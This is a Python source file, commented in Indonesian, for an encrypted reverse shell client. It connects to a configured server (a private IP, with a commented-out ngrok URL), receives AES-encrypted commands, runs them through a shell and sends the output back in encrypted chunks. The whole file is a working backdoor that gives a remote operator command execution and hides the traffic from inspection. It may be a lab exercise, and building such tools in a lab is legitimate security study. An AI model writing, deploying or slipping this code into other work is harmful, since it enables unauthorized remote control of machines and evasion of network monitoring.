import subprocess, socket, os
import sys
import io
import pyAesCrypt

#masukkan ip dan port server
HOST = '192.168.64.1'
PORT = 4420
# HOST = 'http://361d-180-244-133-10.ngrok.io'

#konfigurasi socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,PORT))

#set buffer size dan passsword
buffersize = 1024
password = 'test'

#encrypt data
def encryptData(msg):
    pbdata = str.encode(msg)
    fIn = io.BytesIO(pbdata)
    fCiph = io.BytesIO()
    pyAesCrypt.encryptStream(fIn, fCiph, password, buffersize)
    datasend = fCiph.getvalue()
    return datasend

#decrypt data
def decryptData(msg):
    fullData = b''
    fCiph = io.BytesIO()
    fDec = io.BytesIO()
    fCiph = io.BytesIO(msg)
    ctlen = len(fCiph.getvalue())
    fCiph.seek(0)
    pyAesCrypt.decryptStream(fCiph, fDec, password, buffersize, ctlen)
    decrypt = str(fDec.getvalue().decode())
    return decrypt

s.sendall(encryptData('Halo\n'))
s.sendall(encryptData('EOFX'))

while 1:
    data = s.recv(1024)
    decrypt = decryptData(data)
    print(decrypt)
    if decrypt == "quit":
        print('\nQuiting...')
        break
    #cd untuk ganti direktori
    elif decrypt[:2] == "cd":
        try: os.chdir(decrypt[3:])
        except: pass
        s.sendall(encryptData('EOFX'))
    #selain itu jalankan proses normal
    else:
        proc = subprocess.Popen(decrypt, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdouput =proc.stdout.read() + proc.stderr.read()
        sendmsg = str(stdouput.decode())
        limitbytes = 675
        #mengecek apakah output harus dibagi atau tidak
        if sys.getsizeof(sendmsg) >= limitbytes:
            #banyaknya data yg harus dikirim
            calcmsg = int(round(sys.getsizeof(sendmsg) / limitbytes))
            #hitung panjangn dari pesan yg dikirm
            sendlen = int(round(len(sendmsg) / calcmsg))
            #jika sendlen>limit bytes maak akan rounding
            while sendlen > limitbytes:
                calcmsg += 1
                sendlen = int(round(len(sendmsg) / calcmsg))
            #konversi ke int apabila didaptakan float
            if isinstance(sendlen, float):
                sendlen = int(sendlen)
            fix_len = sendlen
            charP = 0
            x = 1
            while x <= calcmsg:
                tosendmsg = sendmsg[charP:sendlen]
                if x == calcmsg:
                    sendlen =len(sendmsg)
                    tosendmsg = sendmsg[charP:sendlen]
                else:
                    sendlen += fix_len
                    charP += fix_len
                print(tosendmsg)
                s.sendall(encryptData(tosendmsg))
                x += 1
            s.sendall(encryptData('EOFX'))
        else:
            s.sendall(encryptData(sendmsg))
            s.sendall(encryptData('EOFX'))
#end process
s.close()
